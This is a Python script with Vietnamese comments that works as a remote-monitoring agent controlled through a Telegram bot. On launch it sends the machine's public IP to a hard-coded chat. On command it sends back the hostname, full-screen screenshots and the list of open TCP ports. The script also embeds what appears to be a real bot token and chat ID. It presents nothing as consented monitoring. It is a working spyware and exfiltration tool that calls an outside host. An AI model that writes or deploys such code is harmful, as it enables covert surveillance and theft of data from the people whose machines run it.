import os
import requests
import telebot
import subprocess
import socket
import pyautogui
import time
import psutil
import io
from PIL import ImageGrab


# Lưu tên máy tính vào biến `myHostname`
hostname = socket.gethostname()

# Thay thế <YOUR_BOT_TOKEN> bằng mã token của bot Telegram của bạn
botToken = '5733747594:AAH4l1isRkDlh3_lvXBV0fng3cg1l7wK9ds'
# Thay thế <YOUR_CHAT_ID> bằng mã chat ID của bạn
chatId = '2010643824'
# Khởi tạo bot Telegram
bot = telebot.TeleBot(botToken)

response = requests.get('https://api.ipify.org?format=json')
data = response.json()
ipAddress = data['ip']
bot.send_message(chatId, f"Kết nối mới tại địa chỉ: {ipAddress}")

# Xử lý yêu cầu lệnh /getip từ bot trên Telegram
@bot.message_handler(commands=['getip'])
def get_ip_address(message):
    try:
        # Gửi yêu cầu lấy địa chỉ IP công khai từ API ipify
        response = requests.get('https://api.ipify.org?format=json')
        data = response.json()
        ipAddress = data['ip']

        # Gửi địa chỉ IP công khai đến kênh hoặc nhóm trên Telegram
        bot.send_message(chatId, f"Địa chỉ IP: {ipAddress}")
        print('Request: get IP')
    except Exception as e:
        print(e)
        

# Xử lý yêu cầu lệnh /getname từ bot trên Telegram
@bot.message_handler(commands=['getname'])
def get_host_name(message):
    chat_id = message.chat.id
    hostname = socket.gethostname()
    bot.send_message(chat_id, f"Hostname: {hostname}")
    print('Request: get Name')

@bot.message_handler(commands=['getscreenshot'])
def handle_get_screenshot(message):
    chat_id = message.chat.id
    # Chụp ảnh màn hình và lưu vào cache
    im = ImageGrab.grab()
    with io.BytesIO() as output:
        im.save(output, format='PNG')
        photo_data = output.getvalue()
        bot.send_photo(chat_id, photo_data, caption='Screenshot')



#Get opened port
@bot.message_handler(commands=['getopenedport'])
def handle_get_opened_port(message):
    chat_id = message.chat.id

    # Lấy danh sách tất cả các kết nối đang mở trên máy tính
    connections = psutil.net_connections()

    # Lọc ra các kết nối TCP đang mở
    tcp_connections = psutil.net_connections(kind='tcp')

    # Lấy danh sách các cổng mở
    opened_ports = [conn.laddr.port for conn in tcp_connections]

    # Gửi danh sách các cổng mở về Telegram
    if opened_ports:
        bot.send_message(chat_id, f"Danh sách các cổng mở: {', '.join(map(str, opened_ports))}")
    else:
        bot.send_message(chat_id, "Không tìm thấy cổng nào đang mở")



# Bắt đầu lắng nghe yêu cầu từ bot Telegram
bot.polling()